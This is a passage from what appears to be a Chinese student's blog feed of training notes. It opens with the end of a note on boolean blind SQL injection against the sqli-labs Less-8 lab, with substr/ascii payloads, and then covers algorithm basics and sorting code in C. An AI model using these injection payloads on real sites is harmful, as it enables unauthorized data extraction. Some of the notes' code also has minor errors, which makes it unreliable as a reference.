substr(database(),1,1)=&#x27;</span>a<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">substr(string, start, length)，其中start从1开始</span></span><br><span class="line"><span class="string">有： http://localhost/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">其中也可以使用ASCII码: <span class="number">1</span><span class="string">&#x27; and ascii(substr((database()),1,1))=97#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记7</title>
      <link href="/2023/11/09/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-11-09-%E7%AC%94%E8%AE%B07/"/>
      <url>/2023/11/09/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-11-09-%E7%AC%94%E8%AE%B07/</url>
      
        <content type="html"><![CDATA[<h2 id="算法通识与部分基础算法"><a href="#算法通识与部分基础算法" class="headerlink" title="算法通识与部分基础算法"></a>算法通识与部分基础算法</h2><ul><li>算法的定义：解题方案的准确而完整的表述，一系列解决问题的清晰表述<br>（解决问题的方法，优劣取决于时间复杂度和空间复杂度，即运行时间和内存限制）</li><li>时间复杂度：一种衡量算法运行时间长短的指标，是时间随输入规模增长而增长的量度（斜率）<br>*空间复杂度即内存随输入规模增长的量度（斜率）</li><li>大O表示法：算法的渐进时间复杂度<br><em>函数或基本操作重复执行次数T(n)，设T(n)&#x3D;time(1+2n)，当n足够大1可以忽略不计，倍数较小时，对于时间复杂度的影响不是很大，通常将常数简化，即T(2n)&#x3D;O(n)，表示一个阶级的时间复杂度</em></li><li>常数阶   O(1)        常量级别</li><li>线性阶   O(n)        循环</li><li>二次方阶O(n^2)    2层循环</li><li>对数阶   O(logN)  for(int i&#x3D;1 ; i&lt;&#x3D;n ; i*2)         即自增呈指数型增长时为对数阶<br><em>if( j % i ==0 ) 这种判断也是对数阶</em></li><li>指数阶    O(2^n)   for (int j &#x3D; 1; j &lt;&#x3D; i * i; ++j)   即判断呈指数型增长时为指数阶</li><li>总时间复杂度,例如:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i * i; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= j; ++k)</span><br><span class="line">        &#123;</span><br><span class="line">            ++sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度是 n * n^2 * n^2 = O(n^5)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i * i; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j % i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= j; ++k)</span><br><span class="line">            &#123;</span><br><span class="line">                ++sum</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度是 n * n^2 * n^2^1/2 = O(n^4)</span></span><br></pre></td></tr></table></figure><h2 id="部分基础算法"><a href="#部分基础算法" class="headerlink" title="部分基础算法"></a>部分基础算法</h2><ul><li><p>贪心：问题分为若干步骤，每次选取最优的选择，以保证总体最优（走一步看一步）</p></li><li><p>这要求我们在每一步时使用尽可能少的嵌套递归等，以下是一个抽象的实例：<br><em>1.最优情况肯定是增加数字总位数，每增加一位相当于原数字乘10<br>2.而需要线段数量最少的就是’1’，所以能添‘1’就尽量添‘1’（2条线段）<br>3.如果线段总条数为奇数会剩余一条线段，而’7’刚好需要三条线段，把第一位数字改为’7’即可<br>4.这样我们就用最小的线段数组成了最大的数字</em></p></li><li><p>前缀和(即S，前缀到前缀之和)：<br><em>时间复杂度高达n*a*q</em>，我们是否可以用其他方式减少时间复杂度呢</p></li><li><p>举例：求第i项到第r项的和</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设i到r有n项，则时间复杂度为O(m*n)</span></span><br><span class="line"><span class="keyword">while</span>(m个询问，每个询问对应一对l和r)&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=l;i&lt;r;i++)&#123;</span><br><span class="line">        sum+=a[i];  <span class="comment">//每次询问都要重新算一遍</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而我们先使用前缀和做个预处理，定义sum[]数组，sum[i]代表a数组中前i个元素的和</span></span><br><span class="line"><span class="keyword">while</span>(m个询问)&#123;</span><br><span class="line">    sum[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//初始条件</span></span><br><span class="line"> <span class="keyword">for</span>(i=l;i&lt;r;i++)&#123;</span><br><span class="line">     sum[i]=sum[i<span class="number">-1</span>]+a[i]</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum[r]-sum[i<span class="number">-1</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将时间复杂度由O(m*n)将为O(m+n)，相当于从O(n)将为O(1)，不用每次重复sum[n]之前的进程（简化）</span></span><br></pre></td></tr></table></figure><ul><li>原数组变为二维数组怎么解决？：<em>每次询问变为了(x1, y1) 到 (x2, y2)这一范围内数组的和</em></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先,(1,4)-(4,1)~(1,1)-(4,4)，因此每次询问时把(x1,y1)改为较小的x和y，把(x2,y2)改为较大的x和y</span></span><br><span class="line"><span class="comment">//可以使用define宏定义（可定义为任何表达式，只会简单的替换不会计算，建议加括号防止结果有误）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min(x,y) ((x)&lt;(y)?(x):(y))  <span class="comment">//define可以定义为带参数的宏（能当函数用无需指定参数类型）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> max(x,y) ((x)&gt;(y)?(x):(y))  <span class="comment">//max是define定义的宏，x和y是形参，参数名可以重复使用</span></span></span><br><span class="line"><span class="comment">//max/x/y都不用指定类型</span></span><br><span class="line"><span class="type">int</span> i1 = min(x1, x2) - <span class="number">1</span>; <span class="comment">// 将坐标调整为从0开始</span></span><br><span class="line"><span class="type">int</span> j1 = min(y1, y2) - <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> i2 = max(x1, x2) - <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> j2 = max(y1, y2) - <span class="number">1</span>;</span><br><span class="line"><span class="comment">//循环体部分：sum[i][j] = sum[i][j-1] + sum[i-1][j] - sum[i-1][j-1] + a[i][j]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">  sum[i][j] = a[i][j];     <span class="comment">//分开写，更加简便（代码更简洁，值得学习）</span></span><br><span class="line">  <span class="keyword">if</span> (i &gt; <span class="number">0</span>) sum[i][j] += sum[i - <span class="number">1</span>][j];</span><br><span class="line">  <span class="keyword">if</span> (j &gt; <span class="number">0</span>) sum[i][j] += sum[i][j - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; j &gt; <span class="number">0</span>) sum[i][j] -= sum[i - <span class="number">1</span>][j - <span class="number">1</span>]; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//print输出（这里只是简编书写，实际上也要用if单独输出(0,0)(1,0)(0,1)三种情况</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum[i2][j2] - sum[i1<span class="number">-1</span>][j2] - sum[i2][j1<span class="number">-1</span>] + sum[i1<span class="number">-1</span>][j1<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><p><code>*sum[x1][y1] = sum[x2][y2] - sum[x1][y2] - sum[x2][y1] + sum\[x1][y1]*</code></p><ul><li>处理前缀和即两个小区间的和减去重叠区间，再加上<code>a[i][j]</code>:</li><li>即<code>***sum[i][j] = sum[i][j - 1] + sum[i - 1][j] - sum[i - 1][j - 1] + a[i][j]***</code>（写在循环体内）</li></ul><h3 id="二分"><a href="#二分" class="headerlink" title="二分"></a>二分</h3><ul><li>二分查找；二分答案；浮点二分  <em>即另外一半不符合条件的舍去</em></li><li>最简易的二分：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是求完数的一些代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> N;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">1</span>; a &lt;= N; a++) &#123;</span><br><span class="line"> <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">1</span>; b &lt;= a / <span class="number">2</span>; b++) <span class="keyword">if</span> (a % b == <span class="number">0</span>) c += b;</span><br><span class="line"> <span class="keyword">if</span> (a == c) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//由于一个数的因子不可能大于本身的二分之一，因此用&lt;=1/2限制范围减小运算量</span></span><br></pre></td></tr></table></figure><ul><li>二分查找：*每次舍去一半区间，达到 log n的复杂度（要防止死循环）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> l=<span class="number">1</span> , r=n;</span><br><span class="line"><span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line"> <span class="type">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line"> <span class="keyword">if</span>(mid&gt;num) r=mid;  <span class="comment">//舍去右区间</span></span><br><span class="line"> <span class="keyword">else</span> l=mid+<span class="number">1</span>;            <span class="comment">//舍去左区间（奇数自动舍，所以+1，奇数实际上中间那个数左右都不要）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//比a+=1快很多,查找的次数呈对数级下降</span></span><br><span class="line"><span class="comment">//用右移（折半）符号也可以写二分查找</span></span><br></pre></td></tr></table></figure><p><em>二分查找也称折半查找，就是每次查找去掉不符合条件的一半区间，直到找到答案<br>1.区间必须有单调性（不能来回跳，不然二分查找就无效了）<br>2.查找第一次出现的位置，如果查到一个值大于等于目标值，就把右半边放弃，因为右半边肯定也大于等于目标值；如果查到值比目标值小，那就放弃左半边<br>![[Pasted image 20231109201446.png]]<br>由长度 l+&#x3D;1 直到算到最长的原木长度思路更改为 原木长度不断二分，直到二分小段数量等于需求数量<br>（大于还能更长，小于段数不够要缩短）</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> l=<span class="number">1</span> , r=n;</span><br><span class="line"><span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line"> <span class="type">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line"> <span class="keyword">if</span>(mid小段数&lt;需求数) r=mid;          <span class="comment">//段数不够，需要缩短</span></span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(mid小段数&gt;需求数) l=mid+<span class="number">1</span>;   <span class="comment">//段数超过，还能加长</span></span><br><span class="line"> <span class="keyword">else</span> length=mid;                    <span class="comment">//得到答案</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//比a+=1快很多,查找的次数呈对数级下降</span></span><br><span class="line"><span class="comment">//用右移（折半）符号也可以写二分查找</span></span><br></pre></td></tr></table></figure><ul><li>二分答案：<br><em>1.答案在一个区间里<br>2.能够判断答案是否正确<br>3.具有单调性</em></li><li>浮点二分<br><em>1.同样是每次判断答案是否正确<br>2.如果小于的话就将l赋为mid，即为舍弃左区间;如果大于就将r赋为mid，即为舍弃右区间<br>3.最后当 r - l &lt; 1E-n时，结束循环（ n可以自己设定，取决于精确度）</em></li></ul><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 10 </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> arr[N] = &#123; <span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">1</span> &#125;;<span class="comment">//创建一个大小为N的数组，方便理解算法</span></span><br><span class="line"> <span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//控制走访轮数</span></span><br><span class="line"> <span class="type">int</span> j = <span class="number">0</span>;<span class="comment">//控制数组元素下标</span></span><br><span class="line"> <span class="type">int</span> temp = <span class="number">0</span>;<span class="comment">//申请一个临时的空间（数组元素交换时需要一个临时空间）</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N - <span class="number">1</span>; i++)<span class="comment">//最多走访N-1轮</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N - <span class="number">1</span>- i; j++)<span class="comment">//每一轮相邻元素只需比较N-1-i次即可</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span> (arr[j] &lt; arr[j + <span class="number">1</span>])</span><br><span class="line">   &#123;</span><br><span class="line">    temp = arr[j];</span><br><span class="line">    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">    arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//for循环执行完毕，排序完成，依次打印出排序完成后的数组元素</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)<span class="comment">//变量i清零赋予新的意义：控制打印个数</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p><img src="https://pic2.zhimg.com/v2-d4e5d0a778dba725091d8317e6bac939_b.webp" alt="1"></p><p>快速排序的每一轮处理其实就是将这一轮的基准数归位，直到所有的数都归位为止，排序就结束了。</p><p><img src="https://img-blog.csdnimg.cn/20200717122456664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pvdV9hbGJlcnQ=,size_16,color_FFFFFF,t_70" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a[<span class="number">101</span>],n;<span class="comment">//定义全局变量，这两个变量需要在子函数中使用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">quicksort</span><span class="params">(<span class="type">int</span> left,<span class="type">int</span> right)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,t,temp;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    temp=a[left]; <span class="comment">//temp中存的就是基准数</span></span><br><span class="line">    i=left;</span><br><span class="line">    j=right;</span><br><span class="line">    <span class="keyword">while</span>(i!=j)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">//顺序很重要，要先从右边开始找</span></span><br><span class="line">       <span class="keyword">while</span>(a[j]&gt;=temp &amp;&amp; i&lt;j)</span><br><span class="line">            j--;</span><br><span class="line">       <span class="comment">//再找右边的</span></span><br><span class="line">       <span class="keyword">while</span>(a[i]&lt;=temp &amp;&amp; i&lt;j)</span><br><span class="line">            i++;</span><br><span class="line">       <span class="comment">//交换两个数在数组中的位置</span></span><br><span class="line">       <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">       &#123;</span><br><span class="line">            t=a[i];</span><br><span class="line">            a[i]=a[j];</span><br><span class="line">            a[j]=t;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最终将基准数归位</span></span><br><span class="line">    a[left]=a[i];</span><br><span class="line">    a[i]=temp;</span><br><span class="line"></span><br><span class="line">    quicksort(left,i<span class="number">-1</span>);<span class="comment">//继续处理左边的，这里是一个递归的过程</span></span><br><span class="line">    quicksort(i+<span class="number">1</span>,right);<span class="comment">//继续处理右边的 ，这里是一个递归的过程</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,t;</span><br><span class="line">    <span class="comment">//读入数据</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    quicksort(<span class="number">1</span>,n); <span class="comment">//快速排序调用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出排序后的结果</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    getchar();</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p><img src="https://pic4.zhimg.com/v2-a29c0dd0186d1f8cef3c5ebdedf3e5a3_b.webp" alt="1"></p><p>具体的我们以一组无序数列｛14，12，15，13，11，16｝为例分解说明，如下图所示：</p><p><img src="https://pic4.zhimg.com/80/v2-2958d4f3d9dd9156f1b5dca6788fe8a7_1440w.webp" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 归并排序（C-迭代版）</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt; y ? x : y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span>* a = arr;</span><br><span class="line">    <span class="type">int</span>* b = (<span class="type">int</span>*) <span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="type">int</span> seg, start;</span><br><span class="line">    <span class="keyword">for</span> (seg = <span class="number">1</span>; seg &lt; len; seg += seg) &#123;</span><br><span class="line">        <span class="keyword">for</span> (start = <span class="number">0</span>; start &lt; len; start += seg + seg) &#123;</span><br><span class="line">            <span class="type">int</span> low = start, mid = min(start + seg, len), high = min(start + seg + seg, len);</span><br><span class="line">            <span class="type">int</span> k = low;</span><br><span class="line">            <span class="type">int</span> start1 = low, end1 = mid;</span><br><span class="line">            <span class="type">int</span> start2 = mid, end2 = high;</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1 &amp;&amp; start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start1] &lt; a[start2] ? a[start1++] : a[start2++];</span><br><span class="line">            <span class="keyword">while</span> (start1 &lt; end1)</span><br><span class="line">                b[k++] = a[start1++];</span><br><span class="line">            <span class="keyword">while</span> (start2 &lt; end2)</span><br><span class="line">                b[k++] = a[start2++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>* temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a != arr) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        b = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 归并排序（C-递归版）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort_recursive</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> reg[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> len = end - start, mid = (len &gt;&gt; <span class="number">1</span>) + start;</span><br><span class="line">    <span class="type">int</span> start1 = start, end1 = mid;</span><br><span class="line">    <span class="type">int</span> start2 = mid + <span class="number">1</span>, end2 = end;</span><br><span class="line">    merge_sort_recursive(arr, reg, start1, end1);</span><br><span class="line">    merge_sort_recursive(arr, reg, start2, end2);</span><br><span class="line">    <span class="type">int</span> k = start;</span><br><span class="line">    <span class="keyword">while</span> (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2)</span><br><span class="line">        reg[k++] = arr[start1] &lt; arr[start2] ? arr[start1++] : arr[start2++];</span><br><span class="line">    <span class="keyword">while</span> (start1 &lt;= end1)</span><br><span class="line">        reg[k++] = arr[start1++];</span><br><span class="line">    <span class="keyword">while</span> (start2 &lt;= end2)</span><br><span class="line">        reg[k++] = arr[start2++];</span><br><span class="line">    <span class="keyword">for</span> (k = start; k &lt;= end; k++)</span><br><span class="line">        arr[k] = reg[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> reg[len];</span><br><span class="line">    merge_sort_recursive(arr, reg, <span class="number">0</span>, len - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h4><p><img src="https://pic1.zhimg.com/v2-827d96b8ca3682e8775f4916f22b45ac_b.webp" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 